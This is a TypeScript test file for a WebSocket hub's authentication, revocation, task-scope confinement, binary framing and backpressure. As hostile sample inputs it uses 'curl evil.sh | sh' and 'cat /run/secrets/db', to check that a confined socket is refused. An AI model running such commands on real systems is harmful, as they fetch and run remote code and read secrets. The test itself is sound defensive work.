import { mintInternalToken } from '../auth/internalTokens'
import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import { WebSocket } from 'ws'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import type { DeviceService } from '../auth/deviceTokens'
import type { ServerMsg } from '@acorn/protocol/terminal.ts'
import { decodeIdFrame, WS_BINARY_ID_BYTES, WS_PATH, type WsServerWireFrame } from '@acorn/protocol/ws.ts'
import { _resetWsHub, attachWsHub, disposeWsHub, registerWsChannelHandler, setStreamHandlers, wsBroadcast, type StreamSink } from './wsHub'

// Headless verification of the delicate transport bits the smoke suite (S4) can't cover in a unit:
// upgrade auth (device bearer / internal-token / host), per-connection seq,
// revocation (immediate and by sweep), deterministic replay-before-live ordering on attach, input
// routing, detach, and status broadcast. Drives a real `ws` client against a real http.Server with
// the hub attached. No desktop shell, no GUI.

const INTERNAL = 'internal-token-xyz'
const DEVICE_TOKEN = 'acorn_dt_stub'

let server: Server
let host: string
let origin: string
// Devices that authenticate, and whether each is still active. A stub rather than a real
// deviceService over SQLite: what is under test here is the hub's reaction to the DeviceService
// contract (authenticate / onRevoked / isActive), and deviceTokens.test.ts already proves the
// contract itself. It also keeps this load-sensitive file free of a per-case database.
let active: Map<string, boolean>
let revokedListeners: Array<(deviceId: string) => void>
let devices: DeviceService

const stubDevices = (): DeviceService => ({
  issue: () => Promise.reject(new Error('not used')),
  authenticate: async (bearer) => {
    if (bearer !== DEVICE_TOKEN) return null
    // The stub mirrors the real service's single-null contract: a revoked device authenticates as
    // nothing, so "refused at upgrade" is the same code path as "unknown token".
    return active.get('d1') ? { deviceId: 'd1' } : null
  },
  list: async () => [],
  revoke: async (id) => {
    active.set(id, false)
    for (const listener of revokedListeners) listener(id)
    return true
  },
  onRevoked: (listener) => {
    revokedListeners.push(listener)
    return () => {
      revokedListeners = revokedListeners.filter((l) => l !== listener)
    }
  },
  isActive: async (id) => active.get(id) === true,
})

const listen = (s: Server) => new Promise<void>((r) => s.listen(0, '127.0.0.1', r))

beforeEach(async () => {
  server = createServer()
  await listen(server)
  const port = (server.address() as AddressInfo).port
  host = `127.0.0.1:${port}`
  origin = `http://${host}`
  active = new Map([['d1', true]])
  revokedListeners = []
  devices = stubDevices()
  // 20ms sweep everywhere: the interval is injected rather than faked, so the sweep runs for real and
  // the assertion is about the socket closing, not about a timer having been scheduled.
  attachWsHub(server, { internalToken: INTERNAL, allowedHosts: new Set([host]), devices, revocationCheckMs: 20 })
})

afterEach(() => {
  // disposeWsHub, not just _resetWsHub: the hub owns a revocation-sweep interval and an onRevoked
  // subscription, and leaking either across cases would let one case's hub terminate another's socket.
  disposeWsHub(server)
  _resetWsHub()
  server.close()
})

// Open a ws with explicit upgrade headers; resolves on open, rejects on the 403 'unexpected-response'.
function open(headers: Record<string, string>): Promise<WebSocket> {
  const ws = new WebSocket(`ws://${host}${WS_PATH}`, { headers })
  return new Promise((resolve, reject) => {
    ws.on('open', () => resolve(ws))
    ws.on('unexpected-response', (_req, res) => reject(new Error(`HTTP ${res.statusCode}`)))
    ws.on('error', reject)
  })
}

const authHeaders = () => ({ host, authorization: `Bearer ${DEVICE_TOKEN}` })

// JSON frames only. Terminal output is a binary frame now (@acorn/protocol/ws.ts § The one binary
// frame), and `binaries` below is how a case reads those.
const frames = (ws: WebSocket): WsServerWireFrame[] => {
  const out: WsServerWireFrame[] = []
  ws.on('message', (d, isBinary) => {
    if (isBinary) return
    out.push(JSON.parse(d.toString()) as WsServerWireFrame)
  })
  return out
}

// Every binary frame this socket received, as it arrived. Kept whole rather than decoded, so a case
// can compare two sockets' frames byte for byte.
const binaries = (ws: WebSocket): Buffer[] => {
  const out: Buffer[] = []
  ws.on('message', (d, isBinary) => {
    if (isBinary) out.push(Buffer.isBuffer(d) ? d : Buffer.concat(d as Buffer[]))
  })
  return out
}

// Terminal session ids are UUIDs (plugins/terminal/src/server/terminal.ts), which is what the frame's
// fixed-width id field is sized for. Spelled out here so a case is not quietly testing the JSON
// fallback for a two-character id.
const SESSION = '11111111-2222-3333-4444-555555555555'
const OTHER_SESSION = '99999999-8888-7777-6666-555555555555'
const decodeText = (frame: Buffer): { id: string; text: string } => {
  const tagged = decodeIdFrame(frame)
  if (!tagged) throw new Error('not an id-tagged frame')
  return { id: tagged.id, text: new TextDecoder().decode(tagged.payload) }
}
// Resolves once the socket has closed, so a revocation assertion waits for the real close rather than
// polling readyState.
const closed = (ws: WebSocket): Promise<void> => new Promise((r) => ws.on('close', () => r()))
// Wait for a server-side effect to arrive, rather than sleeping a fixed interval and hoping. A
// fixed 30ms sleep is what made this file the suite's most frequent load-sensitive failure: 30ms
// is plenty on an idle machine and not always enough with 6 packages testing concurrently. The
// timeout is generous because it only bounds a genuine hang, never the happy path.
const waitFor = async (predicate: () => boolean, label: string, timeoutMs = 5_000): Promise<void> => {
  const deadline = Date.now() + timeoutMs
  while (!predicate()) {
    if (Date.now() > deadline) throw new Error(`timed out waiting for ${label}`)
    await new Promise((r) => setTimeout(r, 5))
  }
}

describe('wsHub auth', () => {
  it('rejects a socket with no token at all', async () => {
    await expect(open({ host })).rejects.toThrow(/403/)
  })

  it('rejects a mismatched Host (DNS-rebinding guard)', async () => {
    await expect(open({ ...authHeaders(), host: 'evil.example.com' })).rejects.toThrow()
  })

  // docs/api-reference.md § Events: the socket is token-authenticated at upgrade. No cookie, no
  // Origin: a broker socket from the desktop helper is not a browser socket, and there is no ambient
  // credential left for an Origin check to defend.
  it('accepts a device bearer, and does not care what Origin says', async () => {
    const ws = await open({ ...authHeaders(), origin: 'http://evil.example.com' })
    expect(ws.readyState).toBe(WebSocket.OPEN)
    ws.close()
  })

  it('rejects a cookie-based credential', async () => {
    await expect(open({ host, origin, cookie: 'session=anything-at-all' })).rejects.toThrow(/403/)
  })

  it('accepts the internal token', async () => {
    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
    expect(ws.readyState).toBe(WebSocket.OPEN)
    ws.close()
  })

  it('rejects a wrong internal token', async () => {
    await expect(open({ host, 'x-acorn-internal': `${mintInternalToken(INTERNAL, { scope: 'service' })}-wrong` })).rejects.toThrow(/403/)
  })

  it('refuses a revoked bearer at the upgrade itself', async () => {
    await devices.revoke('d1')
    await expect(open({ host, authorization: `Bearer ${DEVICE_TOKEN}` })).rejects.toThrow(/403/)
  })

  // A presented-and-rejected credential is a rejection, not an invitation to try the next mechanism.
  it('does not fall back to the internal token when a bearer is present but bad', async () => {
    await expect(open({ host, authorization: 'Bearer acorn_dt_wrong', 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })).rejects.toThrow(/403/)
  })
})

describe('wsHub seq and revocation', () => {
  it('stamps a per-connection seq from 1, and restarts at 1 on a fresh socket', async () => {
    const first = await open(authHeaders())
    const got = frames(first)
    wsBroadcast({ channel: 'term:status' })
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => got.length >= 2, 'two broadcasts')
    expect(got.map((f) => f.seq)).toEqual([1, 2])
    first.close()
    await closed(first)

    // seq is per-connection, not per-node: a reconnect starts over, which is why the broker compares
    // only within one socket's lifetime.
    const second = await open(authHeaders())
    const again = frames(second)
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => again.length >= 1, 'a broadcast on the new socket')
    expect(again[0].seq).toBe(1)
    second.close()
  })

  it('closes a live socket the moment its device is revoked', async () => {
    const ws = await open({ host, authorization: `Bearer ${DEVICE_TOKEN}` })
    const gone = closed(ws)
    // Fire only the revocation signal and leave isActive() true, so a close can only have come from
    // the onRevoked listener. Revoking for real here would leave the 20ms sweep as an alternative
    // explanation, and the two paths are separately load-bearing.
    for (const listener of revokedListeners) listener('d1')
    await gone
    expect(ws.readyState).toBe(WebSocket.CLOSED)
  })

  // The backstop: a revoke this hub never heard about (another process, or a listener registered after
  // the fact) still closes the socket, because a long-lived stream holds no bearer to re-present.
  it('sweeps away a socket whose device was revoked out of band', async () => {
    const ws = await open({ host, authorization: `Bearer ${DEVICE_TOKEN}` })
    const gone = closed(ws)
    active.set('d1', false) // revoked without firing onRevoked
    await gone
    expect(ws.readyState).toBe(WebSocket.CLOSED)
  })

  // Revocation is per-device, so an internal-token socket (a child process this node spawned, with no
  // device row) must survive a device being revoked out from under a client.
  it('leaves an internal-token socket alone when a device is revoked', async () => {
    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
    await devices.revoke('d1')
    const got = frames(ws)
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => got.length >= 1, 'the socket to still be receiving')
    expect(ws.readyState).toBe(WebSocket.OPEN)
    ws.close()
  })
})

describe('wsHub heartbeat', () => {
  it('terminates a socket whose peer stops answering pings', async () => {
    // `autoPong: false` is what makes this test possible and what makes it honest: a `ws` client
    // answers pings inside the library, below any application code, so a socket that has genuinely
    // gone away is indistinguishable in a test from one that has not, unless the client is told to
    // stay silent.
    const ws = new WebSocket(`ws://${host}${WS_PATH}`, { headers: authHeaders(), autoPong: false })
    await new Promise((resolve, reject) => {
      ws.on('open', resolve)
      ws.on('unexpected-response', () => reject(new Error('upgrade refused')))
    })
    await closed(ws)
    expect(ws.readyState).toBe(WebSocket.CLOSED)
  })

  it('leaves a socket alone for as long as it keeps answering', async () => {
    const ws = await open(authHeaders())
    const got = frames(ws)
    // Long enough for several sweeps at 20ms, so "still open" means the heartbeat looked at it and let
    // it be, not that the timer had not fired yet. Without that, a heartbeat that terminated every
    // socket would pass this case.
    await new Promise((resolve) => setTimeout(resolve, 200))
    expect(ws.readyState).toBe(WebSocket.OPEN)
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => got.length >= 1, 'the socket to still be receiving')
    ws.close()
  })
})

describe('wsHub streaming', () => {
  it('delivers ready + initial screen BEFORE any live frame on attach, and routes input', async () => {
    const inputs: string[] = []
    let liveSink: StreamSink | null = null
    setStreamHandlers({
      input: (_id, data) => inputs.push(data),
      attach: (_id, sink) => {
        liveSink = sink
        sink({ type: 'ready', session: { id: SESSION } as never, replayed: true })
        sink({ type: 'output', data: 'SCREEN' })
      },
      detach: () => {},
      streamTaskId: () => 'task-1',
    })
    const ws = await open(authHeaders())
    const got = frames(ws)
    const bin = binaries(ws)
    ws.send(JSON.stringify({ channel: 'term:attach', id: SESSION }))
    // Load-bearing: LIVE must be pushed only after ready and SCREEN have been delivered, or the
    // ordering assertion below proves nothing.
    await waitFor(() => got.length >= 1 && bin.length >= 1, 'ready + initial screen')
    liveSink!({ type: 'output', data: 'LIVE' } satisfies ServerMsg)
    await waitFor(() => bin.length >= 2, 'the live frame')
    // `ready` carries a session object, so it is still JSON. Spelled out rather than Extract<>'d: the
    // frame envelope is open now, so there is no union left to discriminate. The shape asserted here
    // is terminal's, and this is a terminal test.
    const outs = got.filter((f) => f.channel === 'term:out') as unknown as { channel: 'term:out'; id: string; msg: ServerMsg }[]
    expect(outs.map((f) => f.msg.type)).toEqual(['ready'])
    // …and the output is bytes, tagged with the session, in order: live strictly after the restore.
    expect(bin.map(decodeText)).toEqual([
      { id: SESSION, text: 'SCREEN' },
      { id: SESSION, text: 'LIVE' },
    ])

    ws.send(JSON.stringify({ channel: 'term:input', id: SESSION, data: 'ls\n' }))
    await waitFor(() => inputs.length > 0, 'input to reach the stream handler')
    expect(inputs).toEqual(['ls\n'])
    ws.close()
  })

  // Phase 6 of the performance programme: output crosses the wire once per broadcast as bytes rather
  // than once per socket as escaped JSON
  // (docs/future/performance/phase-6-terminals-work-only-when-watched.md).
  it('sends one binary frame per attached socket, byte for byte the same', async () => {
    const sinks: StreamSink[] = []
    setStreamHandlers({
      input: () => {},
      attach: (_id, sink) => sinks.push(sink),
      detach: () => {},
      streamTaskId: () => 'task-1',
    })
    const first = await open(authHeaders())
    const second = await open(authHeaders())
    const firstBin = binaries(first)
    const secondBin = binaries(second)
    first.send(JSON.stringify({ channel: 'term:attach', id: SESSION }))
    second.send(JSON.stringify({ channel: 'term:attach', id: SESSION }))
    await waitFor(() => sinks.length === 2, 'both attaches')

    // One ServerMsg handed to every sink, which is what the engine does on its coalescing tick, so the
    // frame is built once and both sockets get that same frame.
    const msg: ServerMsg = { type: 'output', data: 'ünïcøde 🌰 "quoted"\r\n' }
    for (const sink of sinks) sink(msg)
    await waitFor(() => firstBin.length >= 1 && secondBin.length >= 1, 'both sockets to receive the frame')

    expect(firstBin).toHaveLength(1)
    expect(firstBin[0].equals(secondBin[0])).toBe(true)
    expect(decodeText(firstBin[0])).toEqual({ id: SESSION, text: msg.type === 'output' ? msg.data : '' })
    // The payload is the bytes and nothing else: no escaping, no base64, no envelope.
    expect(firstBin[0].length).toBe(WS_BINARY_ID_BYTES + Buffer.byteLength('ünïcøde 🌰 "quoted"\r\n', 'utf8'))
    first.close()
    second.close()
  })

  it('takes no sequence number, so the invalidation channel stays contiguous', async () => {
    let sink: StreamSink | null = null
    setStreamHandlers({
      input: () => {},
      attach: (_id, s) => void (sink = s),
      detach: () => {},
      streamTaskId: () => 'task-1',
    })
    const ws = await open(authHeaders())
    const got = frames(ws)
    const bin = binaries(ws)
    ws.send(JSON.stringify({ channel: 'term:attach', id: SESSION }))
    await waitFor(() => sink !== null, 'the attach')

    wsBroadcast({ channel: 'tasks:changed' })
    for (let i = 0; i < 5; i += 1) sink!({ type: 'output', data: `chunk ${i}` })
    wsBroadcast({ channel: 'plugins:changed' })
    await waitFor(() => bin.length >= 5 && got.length >= 2, 'five binary frames between two pings')

    // Five frames of output in the middle, and the two pings around them are still 1 and 2. A gap is
    // what the broker reads as loss (docs/terminal.md § Backpressure), and output was never part of
    // that count.
    expect(got.map((f) => [f.channel, f.seq])).toEqual([
      ['tasks:changed', 1],
      ['plugins:changed', 2],
    ])
    ws.close()
  })

  it('falls back to a JSON frame for a stream id the binary frame cannot spell', async () => {
    let sink: StreamSink | null = null
    setStreamHandlers({
      input: () => {},
      attach: (_id, s) => void (sink = s),
      detach: () => {},
      streamTaskId: () => 'task-1',
    })
    const ws = await open(authHeaders())
    const got = frames(ws)
    const bin = binaries(ws)
    // Not a UUID, so it does not fit the fixed-width id field. The output still has to arrive.
    ws.send(JSON.stringify({ channel: 'term:attach', id: 'short-id' }))
    await waitFor(() => sink !== null, 'the attach')
    sink!({ type: 'output', data: 'STILL DELIVERED' })
    await waitFor(() => got.length >= 1, 'the JSON fallback')

    expect(bin).toEqual([])
    expect(got[0]).toMatchObject({ channel: 'term:out', id: 'short-id', msg: { type: 'output', data: 'STILL DELIVERED' } })
    ws.close()
  })

  it('ignores a JSON frame without a channel before it reaches a handler', async () => {
    const seen: string[] = []
    setStreamHandlers({ input: () => {}, attach: () => {}, detach: () => {}, streamTaskId: () => 'task-1' })
    registerWsChannelHandler('docker', {
      onFrame: (frame) => seen.push(frame.channel),
      onDisconnect: () => {},
    })
    const ws = await open(authHeaders())
    ws.send(JSON.stringify({ id: 'not-a-frame', data: 'ignored' }))
    ws.send(JSON.stringify({ channel: 42, data: 'ignored' }))
    ws.send(JSON.stringify({ channel: 'docker:valid' }))
    await waitFor(() => seen.length === 1, 'the valid frame to reach the handler')
    expect(seen).toEqual(['docker:valid'])
    ws.close()
  })

  it('routes prefixed frames to a registered channel handler and signals disconnect', async () => {
    const seen: string[] = []
    const disconnects: object[] = []
    registerWsChannelHandler('docker', {
      onFrame: (frame, send) => {
        seen.push(frame.channel)
        send({ channel: 'docker:log', id: 'c1', data: 'hi' })
      },
      onDisconnect: (conn) => disconnects.push(conn),
    })
    // Terminal handlers untouched: term frames still need setStreamHandlers, unknown prefixes are dropped.
    const ws = await open(authHeaders())
    const got = frames(ws)
    ws.send(JSON.stringify({ channel: 'docker:logs:attach', id: 'c1' }))
    ws.send(JSON.stringify({ channel: 'nobody:home' }))
    await waitFor(() => got.length > 0, 'the handler reply to reach the client')
    expect(seen).toEqual(['docker:logs:attach']) // 'nobody:home' has no handler and is dropped
    expect(got).toEqual([{ channel: 'docker:log', id: 'c1', data: 'hi', seq: 1 }])
    ws.close()
    await waitFor(() => disconnects.length === 1, 'the hub to signal disconnect')
  })

  it('detach removes the sink; status broadcast reaches the socket', async () => {
    let detached = false
    setStreamHandlers({ input: () => {}, attach: (_id, sink) => sink({ type: 'ready', session: { id: 's1' } as never, replayed: false }), detach: () => (detached = true), streamTaskId: () => 'task-1' })
    const ws = await open(authHeaders())
    const got = frames(ws)
    ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
    await waitFor(() => got.length > 0, 'the attach reply')
    ws.send(JSON.stringify({ channel: 'term:detach', id: 's1' }))
    await waitFor(() => detached, 'detach to reach the stream handler')
    expect(detached).toBe(true)
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => got.some((f) => f.channel === 'term:status'), 'the status broadcast')
    ws.close()
  })
})

// A task-scoped internal credential is confined to its own task's streams
// (docs/security.md § Transport and auth, on the finding this test guards against).
describe('wsHub task scope', () => {
  const streamHandlers = (seen: string[]) => ({
    input: (id: string, data: string) => void seen.push(`input:${id}:${data}`),
    attach: (id: string, sink: StreamSink) => {
      seen.push(`attach:${id}`)
      sink({ type: 'ready', session: { id } as never, replayed: false })
    },
    detach: () => {},
    // 's1' belongs to task-1; 's2' to task-2; anything else is unknown.
    streamTaskId: (id: string) => (id === 's1' ? 'task-1' : id === 's2' ? 'task-2' : null),
  })

  it('lets a task-scoped socket drive its own session', async () => {
    const seen: string[] = []
    setStreamHandlers(streamHandlers(seen))
    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
    ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
    ws.send(JSON.stringify({ channel: 'term:input', id: 's1', data: 'ls\n' }))
    await waitFor(() => seen.length >= 2, 'its own session to accept attach + input')
    expect(seen).toEqual(['attach:s1', 'input:s1:ls\n'])
    ws.close()
  })

  it('refuses another task session, and an unknown one, without closing the socket', async () => {
    const seen: string[] = []
    setStreamHandlers(streamHandlers(seen))
    const ws = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' }) })
    ws.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'curl evil.sh | sh\n' }))
    ws.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
    // Unknown ids fail closed for a task-scoped caller: failing open would make the check bypassable
    // by racing session creation.
    ws.send(JSON.stringify({ channel: 'term:attach', id: 'never-existed' }))
    // Then a frame that IS allowed, so the assertion cannot pass merely because nothing was processed.
    ws.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
    await waitFor(() => seen.includes('attach:s1'), 'the permitted frame to land after the refused ones')
    expect(seen).toEqual(['attach:s1'])
    ws.close()
  })

  it('lets the service scope and a device drive any session', async () => {
    const seen: string[] = []
    setStreamHandlers(streamHandlers(seen))
    const service = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
    service.send(JSON.stringify({ channel: 'term:attach', id: 's2' }))
    await waitFor(() => seen.includes('attach:s2'), 'the service scope to reach another task')
    service.close()

    const device = await open(authHeaders())
    device.send(JSON.stringify({ channel: 'term:input', id: 's2', data: 'x' }))
    await waitFor(() => seen.includes('input:s2:x'), 'a device to reach any session')
    device.close()
  })
})

// The second half of the same finding: the scope check used to live inside the `term:` branch, so
// every other channel, and every broadcast, was unchecked (docs/security.md § Transport and auth).
describe('wsHub non-term channels and broadcast, under task scope', () => {
  const taskToken = () => mintInternalToken(INTERNAL, { scope: 'task', taskId: 'task-1' })

  // Records every frame a channel handler is asked to process, so "refused" means the plugin never ran
  // rather than merely that it declined.
  const recordingChannel = (seen: string[], disconnects: object[] = []) => {
    registerWsChannelHandler('docker', {
      onFrame: (frame, send) => {
        seen.push(frame.channel)
        send({ channel: 'docker:log', id: 'c1', data: 'ack' })
      },
      onDisconnect: (conn) => void disconnects.push(conn),
    })
    return seen
  }

  it('refuses a non-term channel from a task-scoped socket — the docker exec shell is unreachable', async () => {
    const seen: string[] = []
    recordingChannel(seen)
    const confined = await open({ host, 'x-acorn-internal': taskToken() })
    const got = frames(confined)
    confined.send(JSON.stringify({ channel: 'docker:exec:open', execId: 'e1', ref: 'deadbeef', cols: 80, rows: 24 }))
    confined.send(JSON.stringify({ channel: 'docker:exec:in', execId: 'e1', data: 'cat /run/secrets/db\n' }))
    confined.send(JSON.stringify({ channel: 'docker:logs:attach', id: 'deadbeef' }))
    confined.close()
    await closed(confined)

    // A control on a second socket, so the assertion cannot pass merely because nothing was processed
    // at all: the same three frames from an unconfined socket must reach the handler.
    const device = await open(authHeaders())
    device.send(JSON.stringify({ channel: 'docker:exec:open', execId: 'e1', ref: 'deadbeef', cols: 80, rows: 24 }))
    await waitFor(() => seen.length > 0, 'the control socket to reach the handler')
    expect(seen).toEqual(['docker:exec:open'])
    expect(got).toEqual([]) // and the confined socket got no reply either
    device.close()
  })

  it('lets the service scope and a device use a non-term channel', async () => {
    const seen: string[] = []
    recordingChannel(seen)
    const service = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
    service.send(JSON.stringify({ channel: 'docker:logs:attach', id: 'deadbeef' }))
    await waitFor(() => seen.length >= 1, 'the service scope to reach the handler')
    service.close()

    const device = await open(authHeaders())
    device.send(JSON.stringify({ channel: 'docker:stats:attach', id: 'deadbeef' }))
    await waitFor(() => seen.length >= 2, 'a device to reach the handler')
    expect(seen).toEqual(['docker:logs:attach', 'docker:stats:attach'])
    device.close()
  })

  // No broadcast frame is task-addressed, so a confined socket gets none of them
  // (docs/security.md § Transport and auth).
  it('does not fan any broadcast to a task-scoped socket, while an unconfined socket still gets them', async () => {
    const confined = await open({ host, 'x-acorn-internal': taskToken() })
    const service = await open({ host, 'x-acorn-internal': mintInternalToken(INTERNAL, { scope: 'service' }) })
    const device = await open(authHeaders())
    const confinedGot = frames(confined)
    const serviceGot = frames(service)
    const deviceGot = frames(device)

    wsBroadcast({ channel: 'workflow:step:event', runId: 'run-in-task-2', stepId: 's1', event: { text: 'SECRET' } })
    wsBroadcast({ channel: 'workflow:notice', notice: { taskId: 'task-2', kind: 'run-done', title: "another task's title" } })
    wsBroadcast({ channel: 'term:status' })
    await waitFor(() => deviceGot.length >= 3 && serviceGot.length >= 3, 'the unconfined sockets to receive all three')
    expect(confinedGot).toEqual([])

    // And the socket is still usable for what it IS entitled to, so "receives nothing" is not "is dead":
    // its own session's output arrives through the per-session sink, which never went through wsBroadcast.
    setStreamHandlers({
      input: () => {},
      attach: (id, sink) => sink({ type: 'ready', session: { id } as never, replayed: false }),
      detach: () => {},
      streamTaskId: () => 'task-1',
    })
    confined.send(JSON.stringify({ channel: 'term:attach', id: 's1' }))
    await waitFor(() => confinedGot.length >= 1, "the confined socket's own stream to reach it")
    expect(confinedGot.map((f) => f.channel)).toEqual(['term:out'])
    confined.close()
    service.close()
    device.close()
  })
})


// Backpressure, which used to be handled by amplifying load: the hub dropped a frame when a socket
// buffered past its mark and incremented `seq` anyway, the broker read the gap as loss and closed the
// socket, and reconnect re-attached every terminal and refetched every active query — at the moment
// the node was busiest (docs/future/performance/architecture.md § 2).
//
// The mark is set to a byte here rather than four megabytes, so the pause and the resume happen over a
// real socket without pushing real megabytes through it. `paused` on the client end is what makes the
// server end's buffer grow.
describe('wsHub backpressure', () => {
  let paused: [string, boolean][]
  let tiny: Server
  let tinyHost: string

  const openTiny = (): Promise<WebSocket> => {
    const ws = new WebSocket(`ws://${tinyHost}${WS_PATH}`, { headers: { host: tinyHost, authorization: `Bearer ${DEVICE_TOKEN}` } })
    return new Promise((resolve, reject) => {
      ws.on('open', () => resolve(ws))
      ws.on('error', reject)
    })
  }

  beforeEach(async () => {
    paused = []
    setStreamHandlers({
      input: () => {},
      attach: () => {},
      detach: () => {},
      streamTaskId: () => 'task-1',
      flowControl: (id, isPaused) => void paused.push([id, isPaused]),
    })
    tiny = createServer()
    await listen(tiny)
    tinyHost = `127.0.0.1:${(tiny.address() as AddressInfo).port}`
    attachWsHub(tiny, { internalToken: INTERNAL, allowedHosts: new Set([tinyHost]), devices, revocationCheckMs: 5_000, maxBufferedBytes: 1 })
  })

  afterEach(() => {
    disposeWsHub(tiny)
    tiny.close()
  })

  // One megabyte of output with the reader stopped, and the producer is asked to stop too.
  it('pauses the stream behind a socket over its mark and resumes it on drain', async () => {
    const ws = await openTiny()
    const got = frames(ws)
    ws.pause()

    const big = 'x'.repeat(1_000_000)
    for (let i = 0; i < 4; i++) wsBroadcast({ channel: 'term:out', id: 's1', msg: { type: 'output', data: big } as never })

    await waitFor(() => paused.some(([, isPaused]) => isPaused), 'the PTY to be paused')
    expect(paused[0]).toEqual(['s1', true])
    // Asked once, not once per frame.
    expect(paused.filter(([, isPaused]) => isPaused)).toHaveLength(1)

    ws.resume()
    await waitFor(() => paused.some(([, isPaused]) => !isPaused), 'the PTY to be resumed on drain')
    expect(paused.at(-1)).toEqual(['s1', false])

    // And nothing was thrown away: every frame the hub was handed arrived, in order, with a contiguous
    // sequence. Dropping bytes out of the middle of a terminal stream corrupts the screen.
    await waitFor(() => got.length >= 4, 'all four frames')
    expect(got.map((f) => f.seq)).toEqual([1, 2, 3, 4])
    ws.close()
  })

  // A socket that dies while it is behind must not leave the PTY it was holding paused for ever.
  it('resumes a held stream when the socket that held it closes', async () => {
    const ws = await openTiny()
    ws.pause()
    const big = 'y'.repeat(1_000_000)
    for (let i = 0; i < 3; i++) wsBroadcast({ channel: 'term:out', id: 's2', msg: { type: 'output', data: big } as never })
    await waitFor(() => paused.some(([, isPaused]) => isPaused), 'the PTY to be paused')

    ws.terminate()
    await waitFor(() => paused.some(([, isPaused]) => !isPaused), 'the PTY to be resumed on close')
    expect(paused.at(-1)).toEqual(['s2', false])
  })

  // The same decision on the binary path, which is the one production actually takes: output reaches a
  // socket through its per-session sink, never through wsBroadcast.
  it('pauses the producer behind a binary frame over the mark, and still sends it', async () => {
    let sink: StreamSink | null = null
    setStreamHandlers({
      input: () => {},
      attach: (_id, s) => void (sink = s),
      detach: () => {},
      streamTaskId: () => 'task-1',
      flowControl: (id, isPaused) => void paused.push([id, isPaused]),
    })
    const ws = await openTiny()
    const bin = binaries(ws)
    ws.send(JSON.stringify({ channel: 'term:attach', id: OTHER_SESSION }))
    await waitFor(() => sink !== null, 'the attach')
    ws.pause()

    const big = 'x'.repeat(1_000_000)
    for (let i = 0; i < 4; i += 1) sink!({ type: 'output', data: big })
    await waitFor(() => paused.some(([, isPaused]) => isPaused), 'the PTY to be paused')
    expect(paused.filter(([, isPaused]) => isPaused)).toEqual([[OTHER_SESSION, true]])

    ws.resume()
    await waitFor(() => paused.some(([, isPaused]) => !isPaused), 'the PTY to be resumed on drain')
    // Nothing was dropped: there is no cursor to replay a hole in a terminal stream from.
    await waitFor(() => bin.length >= 4, 'all four frames')
    expect(bin.map((frame) => decodeText(frame).text.length)).toEqual([big.length, big.length, big.length, big.length])
    ws.close()
  })

  // An invalidation ping has no producer to slow down, so it is the one thing still shed. What must not
  // happen is a gap: the broker closes on one, and the whole point is not to reconnect under load.
  it('sheds a non-stream frame as a marker, keeping seq contiguous', async () => {
    const ws = await openTiny()
    const got = frames(ws)
    ws.pause()

    wsBroadcast({ channel: 'term:out', id: 's3', msg: { type: 'output', data: 'z'.repeat(1_000_000) } as never })
    // Now the socket is over its mark, and these have nobody to pause.
    wsBroadcast({ channel: 'tasks:changed' })
    wsBroadcast({ channel: 'tasks:changed' })
    wsBroadcast({ channel: 'plugins:changed' })

    ws.resume()
    await waitFor(() => got.some((f) => f.channel === 'ws:shed'), 'the shed marker')
    // One marker for the whole congested window, and it took the sequence number the first shed frame
    // would have had. Nothing after it skips a number.
    expect(got.filter((f) => f.channel === 'ws:shed')).toHaveLength(1)
    expect(got.map((f) => f.seq)).toEqual(got.map((_f, i) => i + 1))
    expect(got.map((f) => f.channel)).toEqual(['term:out', 'ws:shed'])
    ws.close()
  })
})
